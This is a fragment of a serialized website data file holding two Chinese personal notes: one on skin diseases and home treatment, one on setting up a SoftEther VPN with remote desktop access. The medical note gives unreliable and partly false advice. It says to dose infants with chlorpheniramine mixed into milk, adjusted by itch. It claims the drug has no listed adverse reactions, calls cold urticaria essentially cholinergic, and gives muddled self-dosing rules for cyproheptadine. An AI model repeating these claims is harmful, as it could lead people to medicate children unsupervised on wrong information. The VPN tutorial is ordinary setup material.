一、牛皮癣\n\n牛皮癣有以下特征。1、是一种基因病：由基因决定的，不能根治；2、是一种环境病：有的患者经常处于湿润的环境，换到干燥的环境生活，或是原本在干燥的环境，换到湿润的环境中，就好了，有条件的人可以换一下环境试试；3、是一种情绪病:牛皮癣的患者多数性格急燥，风风火火，试着控制一下情绪，说话做事要慢慢来；4、是一种谱性病，有这种基因的人之中，一部分人一生只发一两次，抹一些药\n\n膏就不再犯了；还有一部分人只是散在的几处，发作时抹一点药，不影响正常生活，也不必太在意；这些人占70%以上。只有极少的人存在红、肿、脓等严重的问题。不要相信哪个医院或医生能彻底治愈，治疗牛皮癣有成熟的治疗方法，都写进了书里，不要乱用药，不然可能会导致本来是70%里面轻症的，演变成重症。\n\n# 二、血管瘤\n\n小小孩的血管瘤，分单纯型和海绵型，一般从出生几个月后开始长出，单纯型的表面光滑、发亮，与小孩同比例增长，不用管它，到过了青春期再处理；海绵型的是突起的，有毛囊窝，表面不反光，会超速生长，要及时做掉。还有一种交界混合型，也要及早治。\n\n# 三、孩子头上起大面积白屑\n\n以下几种情况根据症状判断是什么病：\n\n1、真菌感染：头发大片起白沫，头发会折，不管是贴跟折的，还是长一点点折的，就是头癣，真菌，抹脚气膏，用“坐等还书”方法治疗。\n\n2、毛发红糠疹：头发没折，没办法治，基因病。\n\n3、银屑病：有束状发，就是头发一束束的，这里不讲，内容太多。\n\n4、头皮屑：洗发水里加碘伏或洁尔阴。\n\n# 四、特异性湿疹\n\n也叫慢性皮炎，这种病是经历了五个环节：1、一次刺激，可能是蚊虫叮咬或吃了、接触了导致过敏的东西，皮肤出现皮疹，只要有皮疹，细胞就会报警，产生组胺；2、如果产生组胺量多，没有及时分解，组胺会入血；3、组胺渗出血管，引发别处的痒；4、表皮挠裂，造成新的皮疹，细胞又报警，又产生组胺；5、恶性循环1-4步，皮疹越来越多，痒越来越重，激活了体内免疫系统，免疫系统产生记忆。这也是为什么很多孩子治疗中出现反跳的原因。\n\n治疗方法：孩子的免疫系统是个半成品，细胞更新快，只需要半年时间，只要半年内不出现恶性循环，等免疫细胞更新完，病就彻底好了。所以在1-2步之间下手治疗最好，外用抹药效果不好，口服药抗组胺才是根本，抗组胺药有：扑尔敏、开瑞坦、息斯敏等，其中鹤叔推荐扑尔敏，优点是安全，在药典中扑尔敏没有不良反应。用法是：试着用。最小的孩子用四分之一片，重的用三分之一片，加到奶粉里，只要不痒了就说明组胺被中和掉了，最严重的从一片开始试服，根据是否止痒来加减药量，找到刚刚好不痒的量，再加一点点，稳定一周左右，开始逐渐减药量，减药量遵循先减中午量，再减上午量，最后减下午量的原则，吃一片的可以到减到四分之三片、再到四分之二、再到四分之一；也可以根据哪个时间段痒的严重的，哪个时段最后减的原则。一旦出现反弹，再把药量加一点点，2-4天后再减量。一般2个\n\n月之内可以减到停药；最严重的，3个月能达到停药。外抹的可以用带“松”字的药膏单独或加凡士林1：1混合抹，很多孩子不用外用药只靠口服药就治好了。\n\n它难治是因为第5步反复的恶性循环，要至少维持孩子半年以上不痒，免疫细胞完全更新后，就彻底脱敏了。大人的免疫系统是成品，更新的会慢很多，需要的时间也更长。\n\n# 五、荨麻疹\n\n荨麻疹种类很多。\n\n干燥型荨麻疹：晚上进被窝就痒，一挠起大疙瘩，半小时内消退掉，是典型的干燥型荨麻疹，用润肤露给它盖上就不发病了，不用吃药。\n\n假性荨麻疹：不是因为对食物过敏，而是短时间吃肉太多，孩子脾胃功能弱，没有把蛋白质完全吸收，所以有一部分入血，所以过节给孩子吃肉少一点慢一点。\n\n寒冷性荨麻疹：冷的时候发作，冬天不必说，夏天下雨，进空调间，所有变冷的环境下发出来的，都有可能是寒冷性荨麻疹。皮肤出现一片一片的风团，很有可能会导致憋死，甚至引起心脏的反应。寒冷性荨麻疹本质就是胆碱性荨麻疹，是体内分泌的胆碱太多造成的。治疗可服赛庚啶片，早中晚各吃一次，药量自己掌握，半片或是一片，那这个药量就可以，要吃几天，不起风团了，或是明显减轻了，那药量太大了。吃药期间不要开车，有一半的人用它治疗胆碱性能荨麻\n\n疹是管用的。\n\n荨麻疹一半以上和饮食有关：病例：发的时间都在晚上，晚上不容易接触花粉，也不容易接触尘螨，为什么在这时候过敏呢，分析可能是和吃有关，晚上尽量少吃，而且不要碰大鱼大肉，这样坚持三天，三天后就没有再发了，分析其根本原因是脾胃功能弱，晚上不消化。\n\n光是起一大堆的风团吃点抗组胺的药，外用炉甘石洗剂。如果有憋着上不来气，心慌，赶快去医院！这是荨麻疹出现了喉头水肿，声带和心脏这些都是会起荨麻疹的，这是第一急疹，一定要去医院。\n\n\n# 注解\n\n“坐等还书”：1、“坐（唑）”是一大类，所以叫“唑等“，如达克宁、孚琪、克霉唑，化学名里都有个“唑”，2、“还”是环利软膏，它是合成药类（环丙酮胺）；3、“书”是指丙烯胺类的药物-特比萘芬，别管叫兰美抒、疗霉舒，后面一定有个舒（抒）字，这几种药每个用两三周，轮着换，可以把一些产生耐药性的真菌都杀死（使用顺序唑、环、另一种唑、舒）。\n\n十滴水：中药，有清热开窍的功效，原本是用于防中暑的内服药，和藿香正气水一类，但不能用藿香正气水带替十滴水。\n\n碘伏：医用碘伏，浓度为1%，市面难买到，一般药店的浓度偏低会降低药效，浓度太高容易烧伤皮肤。\n\n开塞露：原本是治疗便秘的外用药，含甘油。\n\n乐肤液：哈西奈德溶液，不要买成乐肤杀菌液。\n\n黄连素：盐酸小檗碱片。\n\n标准黄连素水：5片黄连素（盐酸小檗碱片）磨碎，加入500毫升水中，不需要加热。\n\n凡士林：无添加的凡士林，首选贝亲凡士林。\n\n甲硝锉、高锰酸钾：都是指的片剂。\n\n烫洗：为防止影响治疗治疗效果，对可能细菌、病毒种植的衣物、床品进行处理，方法是将衣物、床品放在大盆里，用开水浇上，等凉后再放洗衣机正常洗涤，频次为一周一次。\n\n抗组胺药：是一大类药，有很多种，常见的有扑尔敏、开瑞坦、西替利嗪等，其中扑尔敏最便宜，且在药典中没有明确的不良反应，相对安全，是鹤叔推荐使用的，但吃完后会困，不能开车，如吃完药需开车，可以选择开瑞坦。\n\n提醒：以上为 鹤粉-灯火阑珊 的个人笔记，整理过程中不免有疏漏和错误，因此只可参考，不作为疾病的诊断和治疗依据。",charsets:{cjk:!0}},{title:"SoftEther实现虚拟局域网",frontmatter:{},regularPath:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/SoftEther%E5%AE%9E%E7%8E%B0%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91.html",relativePath:"book-sketches/电脑工具/SoftEther实现虚拟局域网.md",key:"v-42d362c4",path:"/book-sketches/%E7%94%B5%E8%84%91%E5%B7%A5%E5%85%B7/SoftEther%E5%AE%9E%E7%8E%B0%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91.html",headers:[{level:2,title:"云服务器",slug:"云服务器",normalizedTitle:"云服务器",charIndex:23},{level:2,title:"使用SoftEther",slug:"使用softether",normalizedTitle:"使用softether",charIndex:92},{level:3,title:"安装SoftEther到服务端",slug:"安装softether到服务端",normalizedTitle:"安装softether到服务端",charIndex:108},{level:3,title:"给服务端设置安全组",slug:"给服务端设置安全组",normalizedTitle:"给服务端设置安全组",charIndex:1884},{level:3,title:"远程管理工具",slug:"远程管理工具",normalizedTitle:"远程管理工具",charIndex:2488},{level:3,title:"客户端连接",slug:"客户端连接",normalizedTitle:"客户端连接",charIndex:3037},{level:3,title:"连不上或者连上了不能上网",slug:"连不上或者连上了不能上网",normalizedTitle:"连不上或者连上了不能上网",charIndex:4231},{level:2,title:"SoftEther配合RDC",slug:"softether配合rdc",normalizedTitle:"softether配合rdc",charIndex:4450},{level:2,title:"说在最后",slug:"说在最后",normalizedTitle:"说在最后",charIndex:6347}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"云服务器 使用SoftEther 安装SoftEther到服务端 给服务端设置安全组 远程管理工具 客户端连接 连不上或者连上了不能上网 SoftEther配合RDC 说在最后",content:'# SoftEther实现虚拟局域网\n\n\n# 云服务器\n\n暂时使用的是阿里云的云服务器ECS，轻量应用服务器、ECS通用型、ECS共享型都可以。\n\n搬瓦工和vultr也可以。\n\n\n# 使用SoftEther\n\n\n# 安装SoftEther到服务端\n\n我们用浏览器打开softether-download网址，选择SoftEther VPN Server组件。我们使用的是阿里云云服务器ECS，操作系统是CentOS Linux，CPU可以通过cat /proc/cpuinfo命令进行查询。在软件列表里选择一个你想要的版本，比如本人选择的是v4.34-9744-beta，右击它复制它的链接。\n\n\n\n然后远程连接我们的ECS（xShell等工具连接），输入cd /usr/local进入个人默认的程序安装路径。然后输入wget https://github.com/SoftEtherVPN/SoftEtherVPN_Stable/releases/download/v4.34-9744-beta/softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz将SoftEther下载到服务端（上一步复制的链接）。\n\n输入tar -zxvf softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz对SoftEther的压缩包进行解压，输入rm softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz对压缩包进行删除（输入yes确认删除），最后留下的vpnserver文件夹就是SoftEther。\n\n输入cd vpnserver进入这个文件夹，再输入make进行编译安装，一路按1同意。\n\ncd /usr/local\nwget clone https://github.com/SoftEtherVPN/SoftEtherVPN_Stable/releases/download/v4.34-9744-beta/softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz\ntar -zxvf softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz\nrm softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz\ncd vpnserver\nmake\n\n\n1\n2\n3\n4\n5\n6\n\n\n安装好SoftEther后，我们要让SoftEther在服务端开机自运行。输入vim /etc/systemd/system/vpnserver.service，再输入i进入输入模式，输入以下内容：\n\n[Unit]\nDescription=vpnserver daemon\nAfter=network.target\n\n[Service]\nType=forking\nExecStart=/usr/local/vpnserver/vpnserver start\nExecStop= /usr/local/vpnserver/vpnserver stop\n\n[Install]\nWantedBy=multi-user.target\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n按Esc退出输入模式，输入:wq退出并保存。最后输入systemctl start vpnserver && systemctl enable vpnserver就设置好了开机启动。可以让服务端停止后再启动（重启），然后输入netstat -tanlp查看进程（杀进程使用kill -9 xxx）。\n\n参考命令：\n\n# 刷新服务列表\nsystemctl daemon-reload\n# 设置开机自启\nsystemctl enable vpnserver\n# 关闭开机自启\nsystemctl disable vpnserver\n# 启动服务\nsystemctl start vpnserver\n# 停止服务\nsystemctl stop vpnserver\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 给服务端设置安全组\n\n云服务器内部的SoftEther依赖的5555可以不用管，因为你在服务器命令行里输入firewall-cmd --state，会发现阿里云服务器操作系统内的防火墙是默认关闭的，所以内部使用5555端口可以不用管了。如果你要放开云服务器本身的防火墙并添加7000端口，可以参考如下命令。\n\n# 先查看防火墙状态\nfirewall-cmd --state\n# 启用防火墙\nsystemctl start firewalld\n# 停用防火墙\nsystemctl stop firewalld\nfirewall-cmd --zone=public --add-port=5555/udp --permanent \nfirewall-cmd --zone=public --add-port=5555/tcp --permanent \n# 放行端口后要重新加载\nfirewall-cmd --reload\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n而外部想访问服务器以及它的一些端口，那就必须放开一些端口，这个是在阿里云控制台——网络与安全——安全组。外部的手机电脑想连接云服务器SoftEther的虚拟网络，必须开放500和4500。至于5555那是内部用的，跟外部使用无关。500和4500开放给谁，也要限定好，不是谁想加就加的。\n\n\n\n安全组的授权对象我们使用的是前缀列表\n\n\n# 远程管理工具\n\n在云服务器里对SoftEther服务进行配置管理是相当的不方便，SoftEther官方给我们提供了一个远程管理工具。比如我在家里的windows系统上使用“远程管理工具”，对云服务器里的SoftEther服务进行管理，这就比较类似于本地使用XShell管理云服务器。\n\n我们用浏览器打开softether-download网址，选择SoftEther VPN Server Manager for Windows组件（如果你MAC就选择MAC版），安装的时候一定要选择“仅限管理工具”（因为Server已经在云服务器上安装好了，本地机器就不用再安装了）。\n\n\n\n\n安装好后，它会自动打开SE-VPN Server Manager (Tools)，然后我们选择“新设置”\n\n\n\n新设置创建好后，我们对它进行“连接”，第一次进入，如果在云服务器SoftEther服务端里没有设置过管理员密码（上一小节我们并没有设置，所以放到这里进行设置），则会在该远程管理工具里弹出管理员密码设置弹框。\n\n\n\n管理员密码设置过后，会弹出“SoftEther VPN Server简单安装”，我们直接关闭这个界面，意思是我们进行手动配置。\n\n\n\n接下来会让你进行“IPsec/L2TP设置”，这个会涉及到客户端连接SoftEther VPN（也就是手机或电脑连接VPN）。一定要把共享密钥记住，在手机或电脑连接VPN时用到。\n\n\n\n然后就会出现SoftEther远程管理器页面，我们可以对默认的hub进行管理，也可以删除默认的建立新的hub。我们这里就删除默认新建hub了。\n\n\n\n\n\n对新hub进行“管理虚拟HUB”，新建用户，你有几台客户端机器就新建几个用户。\n\n\n\n\n开启NAT地址转换和DHCP服务，这个是为了给客户端机器分配虚拟网络IP的。值得注意的是，“应用到客户端的选项”我们全部清空了，意思是让客户端使用自己的网关，否则可能上不了网。\n\n\n\n\n\n其他除了5555端口暂时都删除\n\n\n\nOpenVpn设置暂时用不着，因为我们使用的是“IPsec/L2TP”方式进行连接的。\n\n\n\n\n# 客户端连接\n\nWindows连接SoftEther VPN，我们并没有使用SoftEther提供的客户端进行SoftEther VPN的连接，而是使用windows自带的VPN功能进行连接的。值得注意的是，预共享密钥就是我们在上一小节“IPsec/L2TP设置”里的共享密钥，至于用户就是“管理虚拟HUB”里新建的用户，用户名的格式得是用户名@hub名。\n\n\n\n\nwindows连接SoftEther VPN后，可能上不了网。需要进行一个设置，不使用远程网络的默认网关，对于本地的请求还是走本地网关。\n\n\n\n\n\n\n\nIOS连接SoftEther VPN，通用——VPN——添加VPN配置，“类型”选择“L2TP”，“描述”随意填写，“服务器”填云服务器的公网IP地址，“账户”就是“用户名@hub名”这样的格式，“密码”填用户对应密码，“密钥”就是“IPsec/L2TP设置”里的共享密钥，“发送所有流量”取消勾选。\n\n安卓连接SoftEther VPN，以三星S8为例，连接——更多连接设置——VPN——添加VPN配置文件，“姓名”随意填写，“类型”选择“L2TP/IPSec PSK”，“服务器地址”填云服务器的公网IP地址，“L2TP密钥”不填，“IPSec识别符”不填，“IPSec预分享密钥”填“IPsec/L2TP设置”里的共享密钥，勾上“显示购机选项”，“DNS搜索域”和“DNS服务器”不填，“转发路由”填hub默认分配IP端192.168.30.0/24（子网掩码是255.255.255.0所以长度是24），用户名就是“用户名@hub名”这样的格式，“密码”填用户对应密码。\n\n/24的意思是11111111.11111111.11111111.00000000（24个1），转为十进制是255.255.255.0，这个255.255.255.0表示192.168.30.0的最后一位可以是是1~244，即192.168.30.1到192.168.30.244。\n\n\n# 连不上或者连上了不能上网\n\n连不上的原因，很大原因是云服务器端口没开放。开放5555端口是为了SoftEther的使用，开发500和4500是为了电脑和手机能正常连接SoftEther。\n\n\n\n电脑连上但不能上网，要关闭“远程网络的默认网关”，IOS也是同理得去掉“发送所有流量”的勾，安卓的话就是“转发路由”填hub默认分配IP端，这些操作都在上一节说过了。它们这样做的原因是本地请求直接走本地网关，有关VPN请求就走VPN。\n\n\n# SoftEther配合RDC\n\nSoftEther也可以使用RD Client进行远程桌面控制，对虚拟局域网中任意两台客户端都可以使用，只要获取它对应的虚拟局域网IP。更多的是一个虚拟局域网的功能，可以联机打游戏、访问局域网内机器里的资料等等。\n\n\n\n使用RD Client进行远程桌面控制的时候，我们就输入上面这个虚拟局域网的IP地址192.168.30.200。如果你的控制端和被控制端都在本地局域网，就直接用第二个红色框IP192.168.0.109。（至于RD Client到底怎么用就不展开了）\n\n每次重连SoftEther VPN，被控制端机器获取的IP地址可能和上一次不一样，这就导致控制端使用RD Client时填写的IP也得跟着改动。所以我们得让这个IP一个固定IP地址。我们先查看SoftEther的DHCP设置，有效IP段是192.168.30.10到192.168.30.200。再让被控制端机器的VPN的虚拟网卡获取IP固定为192.168.30.200。\n\n\n\n\n\n手动连接VPN其实很麻烦，一旦我们不在电脑前就无法手动连VPN了，所以我们需要电脑开机后自动连接VPN。Windows环境的话，在SoftEther目录（其他目录也可以）下新建startvpn.bat批处理文件，使用文本编辑器打开并编辑：\n\n@echo off\nrem WIFI名称\nset wifi_name=TP-LINK_602\nrem 连接WIFI\n(netsh WLAN show interfaces | findStr %wifi_name% >nul &amp;&amp; ( \n    echo wifi already connected\n)) || (\n    netsh wlan connect ssid=%wifi_name% name=%wifi_name%\n    echo wifi connect succeed\n)\nrem 延迟2秒\ntimeout /t 2 /nobreak\nrem 连接VPN\n(ipconfig|find/i "myvpn" &amp;&amp; (\n    echo vpn already connected\n)) || (\n    rasdial myvpn user2@hub1 123456\n    echo vpn connect succeed\n)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n大致解释一下：@echo off是不显示执行框，rem是注释标识符，set定义一个变量，netsh WLAN show interfaces是查看当前连接wifi的信息，findStr %wifi_name%是进一步查看wifi连接信息里的wifi名，echo xxx是提示语xxx，netsh wlan connect ssid=%wifi_name% name=%wifi_name%是连接到某个wifi，查看ssid可以使用netsh wlan show networks mode=bssid，ipconfig|find/i "myvpn"表示连上vpn没有如果连上是能查到vpn名称的，rasdial myvpn user2@hub1 123456是连接到名为myvpn的vpn，账号格式是用户名@hub名。\n\n我们将准备好的startvpn.bat加入到任务计划程序，让startvpn.bat在电脑开机时执行。打开电脑的“任务计划程序”，选择右侧的“创建任务...”。\n\n * 在常规这个页签里，名称填为“myvpn”，然后勾上“不管用户是否登录都要运行”、“使用最高权限运行”、“隐藏”。\n * 在触发器这个页签里，选择新建，然后开始任务选择“启动时”，可以自己选择是否重复执行以及间隔。\n * 在操作这个页签里，选择新建，然后点击“浏览”选择前面创建的“startvpn.bat”，最后在“起始于”里填写startvpn.bat的父路径（D:\\SoftEther VPN Server Manager）。\n * 返回常规页签，然后点击确定，输入电脑登录密码，就完成了VPN的自动连接。\n\n至于怎么让被控制端机器怎么自动开机，这就涉及到“电源管理”，比如戴尔的BOIS的“Power Management”、“Auto On Mode”、“Auto On Time”、“wake ON lan/wan ”、“USB Wake Support”等。\n\n\n# 说在最后\n\nSoftEther相比Frp就安全一些，有用户分配、密码验证、秘钥验证等等，并且客户端使用不需要下载什么文件软件等，直接使用系统自带工具连接。如果只是单纯的用RDC远程桌面控制，用Frp就足够了；如果要多台机器联机使用就用SoftEther。\n\n最好不要使用该技术应用到国外云服务器上，就算你用了也要低调使用（学习IT技术、理智获取国外资讯等），也不要做违法犯罪的事（这个就不用多说了吧）。',normalizedContent:'# softether实现虚拟局域网\n\n\n# 云服务器\n\n暂时使用的是阿里云的云服务器ecs，轻量应用服务器、ecs通用型、ecs共享型都可以。\n\n搬瓦工和vultr也可以。\n\n\n# 使用softether\n\n\n# 安装softether到服务端\n\n我们用浏览器打开softether-download网址，选择softether vpn server组件。我们使用的是阿里云云服务器ecs，操作系统是centos linux，cpu可以通过cat /proc/cpuinfo命令进行查询。在软件列表里选择一个你想要的版本，比如本人选择的是v4.34-9744-beta，右击它复制它的链接。\n\n\n\n然后远程连接我们的ecs（xshell等工具连接），输入cd /usr/local进入个人默认的程序安装路径。然后输入wget https://github.com/softethervpn/softethervpn_stable/releases/download/v4.34-9744-beta/softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz将softether下载到服务端（上一步复制的链接）。\n\n输入tar -zxvf softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz对softether的压缩包进行解压，输入rm softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz对压缩包进行删除（输入yes确认删除），最后留下的vpnserver文件夹就是softether。\n\n输入cd vpnserver进入这个文件夹，再输入make进行编译安装，一路按1同意。\n\ncd /usr/local\nwget clone https://github.com/softethervpn/softethervpn_stable/releases/download/v4.34-9744-beta/softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz\ntar -zxvf softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz\nrm softether-vpnserver-v4.34-9744-beta-2020.03.20-linux-x64-64bit.tar.gz\ncd vpnserver\nmake\n\n\n1\n2\n3\n4\n5\n6\n\n\n安装好softether后，我们要让softether在服务端开机自运行。输入vim /etc/systemd/system/vpnserver.service，再输入i进入输入模式，输入以下内容：\n\n[unit]\ndescription=vpnserver daemon\nafter=network.target\n\n[service]\ntype=forking\nexecstart=/usr/local/vpnserver/vpnserver start\nexecstop= /usr/local/vpnserver/vpnserver stop\n\n[install]\nwantedby=multi-user.target\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n按esc退出输入模式，输入:wq退出并保存。最后输入systemctl start vpnserver && systemctl enable vpnserver就设置好了开机启动。可以让服务端停止后再启动（重启），然后输入netstat -tanlp查看进程（杀进程使用kill -9 xxx）。\n\n参考命令：\n\n# 刷新服务列表\nsystemctl daemon-reload\n# 设置开机自启\nsystemctl enable vpnserver\n# 关闭开机自启\nsystemctl disable vpnserver\n# 启动服务\nsystemctl start vpnserver\n# 停止服务\nsystemctl stop vpnserver\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 给服务端设置安全组\n\n云服务器内部的softether依赖的5555可以不用管，因为你在服务器命令行里输入firewall-cmd --state，会发现阿里云服务器操作系统内的防火墙是默认关闭的，所以内部使用5555端口可以不用管了。如果你要放开云服务器本身的防火墙并添加7000端口，可以参考如下命令。\n\n# 先查看防火墙状态\nfirewall-cmd --state\n# 启用防火墙\nsystemctl start firewalld\n# 停用防火墙\nsystemctl stop firewalld\nfirewall-cmd --zone=public --add-port=5555/udp --permanent \nfirewall-cmd --zone=public --add-port=5555/tcp --permanent \n# 放行端口后要重新加载\nfirewall-cmd --reload\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n而外部想访问服务器以及它的一些端口，那就必须放开一些端口，这个是在阿里云控制台——网络与安全——安全组。外部的手机电脑想连接云服务器softether的虚拟网络，必须开放500和4500。至于5555那是内部用的，跟外部使用无关。500和4500开放给谁，也要限定好，不是谁想加就加的。\n\n\n\n安全组的授权对象我们使用的是前缀列表\n\n\n# 远程管理工具\n\n在云服务器里对softether服务进行配置管理是相当的不方便，softether官方给我们提供了一个远程管理工具。比如我在家里的windows系统上使用“远程管理工具”，对云服务器里的softether服务进行管理，这就比较类似于本地使用xshell管理云服务器。\n\n我们用浏览器打开softether-download网址，选择softether vpn server manager for windows组件（如果你mac就选择mac版），安装的时候一定要选择“仅限管理工具”（因为server已经在云服务器上安装好了，本地机器就不用再安装了）。\n\n\n\n\n安装好后，它会自动打开se-vpn server manager (tools)，然后我们选择“新设置”\n\n\n\n新设置创建好后，我们对它进行“连接”，第一次进入，如果在云服务器softether服务端里没有设置过管理员密码（上一小节我们并没有设置，所以放到这里进行设置），则会在该远程管理工具里弹出管理员密码设置弹框。\n\n\n\n管理员密码设置过后，会弹出“softether vpn server简单安装”，我们直接关闭这个界面，意思是我们进行手动配置。\n\n\n\n接下来会让你进行“ipsec/l2tp设置”，这个会涉及到客户端连接softether vpn（也就是手机或电脑连接vpn）。一定要把共享密钥记住，在手机或电脑连接vpn时用到。\n\n\n\n然后就会出现softether远程管理器页面，我们可以对默认的hub进行管理，也可以删除默认的建立新的hub。我们这里就删除默认新建hub了。\n\n\n\n\n\n对新hub进行“管理虚拟hub”，新建用户，你有几台客户端机器就新建几个用户。\n\n\n\n\n开启nat地址转换和dhcp服务，这个是为了给客户端机器分配虚拟网络ip的。值得注意的是，“应用到客户端的选项”我们全部清空了，意思是让客户端使用自己的网关，否则可能上不了网。\n\n\n\n\n\n其他除了5555端口暂时都删除\n\n\n\nopenvpn设置暂时用不着，因为我们使用的是“ipsec/l2tp”方式进行连接的。\n\n\n\n\n# 客户端连接\n\nwindows连接softether vpn，我们并没有使用softether提供的客户端进行softether vpn的连接，而是使用windows自带的vpn功能进行连接的。值得注意的是，预共享密钥就是我们在上一小节“ipsec/l2tp设置”里的共享密钥，至于用户就是“管理虚拟hub”里新建的用户，用户名的格式得是用户名@hub名。\n\n\n\n\nwindows连接softether vpn后，可能上不了网。需要进行一个设置，不使用远程网络的默认网关，对于本地的请求还是走本地网关。\n\n\n\n\n\n\n\nios连接softether vpn，通用——vpn——添加vpn配置，“类型”选择“l2tp”，“描述”随意填写，“服务器”填云服务器的公网ip地址，“账户”就是“用户名@hub名”这样的格式，“密码”填用户对应密码，“密钥”就是“ipsec/l2tp设置”里的共享密钥，“发送所有流量”取消勾选。\n\n安卓连接softether vpn，以三星s8为例，连接——更多连接设置——vpn——添加vpn配置文件，“姓名”随意填写，“类型”选择“l2tp/ipsec psk”，“服务器地址”填云服务器的公网ip地址，“l2tp密钥”不填，“ipsec识别符”不填，“ipsec预分享密钥”填“ipsec/l2tp设置”里的共享密钥，勾上“显示购机选项”，“dns搜索域”和“dns服务器”不填，“转发路由”填hub默认分配ip端192.168.30.0/24（子网掩码是255.255.255.0所以长度是24），用户名就是“用户名@hub名”这样的格式，“密码”填用户对应密码。\n\n/24的意思是11111111.11111111.11111111.00000000（24个1），转为十进制是255.255.255.0，这个255.255.255.0表示192.168.30.0的最后一位可以是是1~244，即192.168.30.1到192.168.30.244。\n\n\n# 连不上或者连上了不能上网\n\n连不上的原因，很大原因是云服务器端口没开放。开放5555端口是为了softether的使用，开发500和4500是为了电脑和手机能正常连接softether。\n\n\n\n电脑连上但不能上网，要关闭“远程网络的默认网关”，ios也是同理得去掉“发送所有流量”的勾，安卓的话就是“转发路由”填hub默认分配ip端，这些操作都在上一节说过了。它们这样做的原因是本地请求直接走本地网关，有关vpn请求就走vpn。\n\n\n# softether配合rdc\n\nsoftether也可以使用rd client进行远程桌面控制，对虚拟局域网中任意两台客户端都可以使用，只要获取它对应的虚拟局域网ip。更多的是一个虚拟局域网的功能，可以联机打游戏、访问局域网内机器里的资料等等。\n\n\n\n使用rd client进行远程桌面控制的时候，我们就输入上面这个虚拟局域网的ip地址192.168.30.200。如果你的控制端和被控制端都在本地局域网，就直接用第二个红色框ip192.168.0.109。（至于rd client到底怎么用就不展开了）\n\n每次重连softether vpn，被控制端机器获取的ip地址可能和上一次不一样，这就导致控制端使用rd client时填写的ip也得跟着改动。所以我们得让这个ip一个固定ip地址。我们先查看softether的dhcp设置，有效ip段是192.168.30.10到192.168.30.200。再让被控制端机器的vpn的虚拟网卡获取ip固定为192.168.30.200。\n\n\n\n\n\n手动连接vpn其实很麻烦，一旦我们不在电脑前就无法手动连vpn了，所以我们需要电脑开机后自动连接vpn。windows环境的话，在softether目录（其他目录也可以）下新建startvpn.bat批处理文件，使用文本编辑器打开并编辑：\n\n@echo off\nrem wifi名称\nset wifi_name=tp-link_602\nrem 连接wifi\n(netsh wlan show interfaces | findstr %wifi_name% >nul &amp;&amp; ( \n    echo wifi already connected\n)) || (\n    netsh wlan connect ssid=%wifi_name% name=%wifi_name%\n    echo wifi connect succeed\n)\nrem 延迟2秒\ntimeout /t 2 /nobreak\nrem 连接vpn\n(ipconfig|find/i "myvpn" &amp;&amp; (\n    echo vpn already connected\n)) || (\n    rasdial myvpn user2@hub1 123456\n    echo vpn connect succeed\n)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n大致解释一下：@echo off是不显示执行框，rem是注释标识符，set定义一个变量，netsh wlan show interfaces是查看当前连接wifi的信息，findstr %wifi_name%是进一步查看wifi连接信息里的wifi名，echo xxx是提示语xxx，netsh wlan connect ssid=%wifi_name% name=%wifi_name%是连接到某个wifi，查看ssid可以使用netsh wlan show networks mode=bssid，ipconfig|find/i "myvpn"表示连上vpn没有如果连上是能查到vpn名称的，rasdial myvpn user2@hub1 123456是连接到名为myvpn的vpn，账号格式是用户名@hub名。\n\n我们将准备好的startvpn.bat加入到任务计划程序，让startvpn.bat在电脑开机时执行。打开电脑的“任务计划程序”，选择右侧的“创建任务...”。\n\n * 在常规这个页签里，名称填为“myvpn”，然后勾上“不管用户是否登录都要运行”、“使用最高权限运行”、“隐藏”。\n * 在触发器这个页签里，选择新建，然后开始任务选择“启动时”，可以自己选择是否重复执行以及间隔。\n * 在操作这个页签里，选择新建，然后点击“浏览”选择前面创建的“startvpn.bat”，最后在“起始于”里填写startvpn.bat的父路径（d:\\softether vpn server manager）。\n * 返回常规页签，然后点击确定，输入电脑登录密码，就完成了vpn的自动连接。\n\n至于怎么让被控制端机器怎么自动开机，这就涉及到“电源管理”，比如戴尔的bois的“power management”、“auto on mode”、“auto on time”、“wake on lan/wan ”、“usb wake support”等。\n\n\n# 